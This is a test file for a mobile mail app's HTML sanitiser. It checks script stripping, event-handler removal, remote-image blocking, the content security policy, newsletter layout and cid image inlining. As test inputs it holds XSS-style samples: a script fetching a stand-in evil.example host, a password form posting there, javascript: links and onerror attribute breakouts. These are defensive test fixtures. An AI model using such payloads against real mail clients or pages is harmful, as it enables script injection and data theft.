// lib/mailHtml.js — the document a stranger's email is rendered inside.
//
// This is the highest-consequence file in the Mail screens: everything it
// wraps was written by whoever sent the message. The checks below are about
// CAPABILITY, not appearance — what the message can still do once it is on a
// phone screen. The web app's equivalent is apps/web/components/mail/
// SafeHtml.tsx, which uses DOMPurify plus a sandboxed iframe; here the
// equivalents are a WebView with JavaScript off (screens/MailMessage.js) and
// the policy this file writes.

const { strip, blockRemoteImages, textToHtml, buildDocument, htmlToText, inlineCidImages } = require('../lib/mailHtml');

test('scripts, frames and forms are removed, with their contents', () => {
  const nasty = '<p>hello</p>'
    + '<script>fetch("https://evil.example/steal")</script>'
    + '<iframe src="https://evil.example"></iframe>'
    + '<form action="https://evil.example"><input name="password"></form>'
    + '<object data="x.swf"></object>';
  const out = strip(nasty);
  expect(out).toContain('<p>hello</p>');
  for (const gone of ['<script', 'fetch(', '<iframe', '<form', '<object']) {
    expect(out).not.toContain(gone);
  }
});

test('inline event handlers and javascript: links are defused', () => {
  const out = strip('<a href="javascript:alert(1)" onclick="alert(2)" onmouseover=\'alert(3)\'>tap</a>');
  expect(out).not.toMatch(/onclick|onmouseover/i);
  expect(out).not.toMatch(/javascript:/i);
  expect(out).toContain('>tap</a>');
});

test('remote images are blocked and counted; data: and cid: are left alone', () => {
  const { html, blocked } = blockRemoteImages(
    '<img src="https://tracker.example/open.gif">'
    + '<img src="http://other.example/a.png">'
    + '<img src="data:image/png;base64,AAA">'
    + '<img src="cid:logo">',
  );
  expect(blocked).toBe(2);
  // A \s before src, so data-blocked-src (which CONTAINS "src=...") does not
  // make this pass by accident — it did on the first run.
  expect(html).not.toMatch(/<img[^>]*\ssrc="https?:/);
  expect(html).toContain('data-blocked-src="https://tracker.example/open.gif"');
  expect(html).toContain('src="data:image/png;base64,AAA"');
  expect(html).toContain('src="cid:logo"');
});

test('the policy allows nothing by default, and no remote images until asked', () => {
  const { document, blocked } = buildDocument({
    html: '<img src="https://tracker.example/open.gif"><p>hi</p>', showImages: false,
  });
  expect(document).toContain("default-src 'none'");
  expect(document).toContain('img-src data: cid:;');
  expect(document).not.toContain('https:;');       // images cannot phone home
  expect(document).not.toContain("script-src");    // nothing grants scripts
  expect(blocked).toBe(1);
});

test('Show images widens ONLY images, and nothing else in the policy', () => {
  const off = buildDocument({ html: '<img src="https://x.example/a.png">', showImages: false }).document;
  const on = buildDocument({ html: '<img src="https://x.example/a.png">', showImages: true }).document;
  expect(on).toContain('img-src data: cid: https:');
  expect(on).toContain('src="https://x.example/a.png"');
  // The only difference between the two documents is the image policy and the
  // image itself: default-src, style-src and font-src are untouched.
  for (const rule of ["default-src 'none'", "style-src 'unsafe-inline'", 'font-src data:']) {
    expect(off).toContain(rule);
    expect(on).toContain(rule);
  }
});

test('a plain-text email is escaped, not rendered as markup', () => {
  const html = textToHtml('1 < 2 & <b>not bold</b>\nsecond line https://tatvaos.com');
  expect(html).toContain('1 &lt; 2 &amp; &lt;b&gt;not bold&lt;/b&gt;');
  expect(html).toContain('<br>');
  expect(html).toContain('<a href="https://tatvaos.com">https://tatvaos.com</a>');
});

test('no HTML body: the text body is used instead of an empty screen', () => {
  const { document } = buildDocument({ html: '', text: 'plain words', showImages: false });
  expect(document).toContain('plain words');
});

// ── FITTING A DESIGNED EMAIL ONTO A PHONE ───────────────────────────────────
//  Amit, 18 Sept 2026: "html designed mail scroll in right and not looking
//  good". A newsletter is nested tables with width="600" and inline pixel
//  widths, so the document was wider than the screen and slid sideways.
//
//  The fix is CSS only, because measuring the content needs JavaScript in the
//  page and that is exactly what this document refuses to run.
describe('a 600px newsletter on a 360px screen', () => {
  const newsletter = '<table width="600" style="width:600px"><tr>'
    + '<td style="width:600px;white-space:nowrap">Quarterly update</td></tr></table>';

  test('a fixed table width is overridden, not merely capped', () => {
    const { document } = buildDocument({ html: newsletter, showImages: false });
    // max-width alone loses to width: the element stays 600px and overflows.
    expect(document).toMatch(/table\{[^}]*width:auto !important/);
    expect(document).toMatch(/table\{[^}]*max-width:100% !important/);
  });

  test('cells may wrap and are not held open by a minimum', () => {
    const { document } = buildDocument({ html: newsletter, showImages: false });
    expect(document).toMatch(/td,th\{[^}]*white-space:normal !important/);
    expect(document).toMatch(/td,th\{[^}]*min-width:0 !important/);
  });

  test('anything still too wide scrolls inside the message, not the page', () => {
    const { document } = buildDocument({ html: newsletter, showImages: false });
    expect(document).toMatch(/\.tv-wrap\{[^}]*overflow-x:auto/);
    expect(document).toMatch(/html,body\{overflow-x:hidden/);
  });

  test('images are capped but NOT forced to auto width', () => {
    // width:auto would spring a 20px icon to its natural size — often huge.
    const { document } = buildDocument({ html: '<img src="cid:x">', showImages: false });
    expect(document).toMatch(/img\{max-width:100% !important;height:auto !important;\}/);
    expect(document).not.toMatch(/img\{[^}]*width:auto/);
  });

  test('the viewport is the device width, so none of the above is undone', () => {
    const { document } = buildDocument({ html: newsletter, showImages: false });
    expect(document).toMatch(/name="viewport" content="width=device-width/);
  });
});

// ── HTML FLATTENED FOR A REPLY QUOTE ────────────────────────────────────────
//  "reply on html designed mail did not pick the content" — the quote read
//  bodyText, which a designed email does not have.
describe('htmlToText', () => {
  test('keeps the words and drops the markup', () => {
    expect(htmlToText('<p>Hello <b>Amit</b></p>')).toBe('Hello Amit');
  });

  test('blocks and <br> become line breaks', () => {
    expect(htmlToText('<p>One</p><p>Two</p>')).toBe('One\nTwo');
    expect(htmlToText('One<br>Two')).toBe('One\nTwo');
  });

  test('a script never contributes its source to the quote', () => {
    const out = htmlToText('<p>Hi</p><script>var stolen = 1;</script>');
    expect(out).toBe('Hi');
    expect(out).not.toMatch(/stolen/);
  });

  test('entities are decoded AFTER tags, so &lt;script&gt; cannot become one', () => {
    expect(htmlToText('<p>a &lt;script&gt; b</p>')).toBe('a <script> b');
  });

  test('list items are readable rather than run together', () => {
    expect(htmlToText('<ul><li>One</li><li>Two</li></ul>')).toBe('• One\n• Two');
  });

  test('runs of blank lines collapse — a table layout is mostly empty cells', () => {
    expect(htmlToText('<div>A</div><div></div><div></div><div>B</div>')).toBe('A\n\nB');
  });

  test('nothing in, nothing out', () => {
    expect(htmlToText('')).toBe('');
    expect(htmlToText(null)).toBe('');
    expect(htmlToText(undefined)).toBe('');
  });
});

// ── pictures inside the email (cid:) ───────────────────────────────────────
// Seen on Amit's Samsung, 19 Sept 2026: a Gmail bounce drew "Error Icon" where
// its picture should be. Nothing resolved cid: anywhere in the product.

const PNG = 'data:image/png;base64,iVBORw0KGgo=';

test('a cid picture is swapped for the data URI the server sent, however it is written', () => {
  const html = `<img src="cid:logo@corp"><img src='CID:a%40b'><td background=cid:bg> <div style="background:url(cid:bg)">`;
  const { html: out, inlined } = inlineCidImages(html, [
    { cid: 'logo@corp', dataUri: PNG }, { cid: 'a@b', dataUri: PNG }, { cid: 'bg', dataUri: PNG },
  ]);
  expect(inlined).toBe(4);
  expect(out).not.toMatch(/cid:/i);
  expect(out).toContain(`<img src="${PNG}">`);
});

test('a cid with no picture is left exactly as it was, not blanked', () => {
  const html = '<img src="cid:known"><img src="cid:missing" alt="logo">';
  const { html: out, inlined } = inlineCidImages(html, [{ cid: 'known', dataUri: PNG }]);
  expect(inlined).toBe(1);
  expect(out).toContain('<img src="cid:missing" alt="logo">');
});

test('only a raster data:image URI is ever written into the page', () => {
  const html = '<img src="cid:x">';
  for (const bad of [
    'https://track.example/p.gif',                    // would be a read receipt behind the block
    'javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'data:image/svg+xml;base64,PHN2Zz4=',             // a document, not a raster
    'data:image/png;base64,AAA" onerror="x',          // breaking out of the attribute
  ]) {
    expect(inlineCidImages(html, [{ cid: 'x', dataUri: bad }])).toEqual({ html, inlined: 0 });
  }
  expect(inlineCidImages(html, null)).toEqual({ html, inlined: 0 });
  expect(inlineCidImages(html, [null, {}, { cid: 5, dataUri: PNG }])).toEqual({ html, inlined: 0 });
});

test('in the document: the picture shows WITHOUT "Show images", and is not counted as blocked', () => {
  const doc = buildDocument({
    html: '<img src="cid:icon.png" alt="Error Icon"><img src="https://track.example/o.gif">',
    inlineImages: [{ cid: 'icon.png', dataUri: PNG }],
    showImages: false,
  });
  expect(doc.document).toContain(`src="${PNG}"`);
  expect(doc.blocked).toBe(1);                         // the tracker, and only the tracker
  expect(doc.document).toContain('data-blocked-src="https://track.example/o.gif"');
});

test('a script smuggled beside a cid picture is still stripped - pictures go in AFTER the sanitiser', () => {
  const doc = buildDocument({
    html: '<script>steal()</script><img src="cid:p" onerror="steal()">',
    inlineImages: [{ cid: 'p', dataUri: PNG }],
    showImages: false,
  });
  const page = doc.document;
  expect(page).not.toContain('steal()');
  expect(page).toContain(PNG);
});
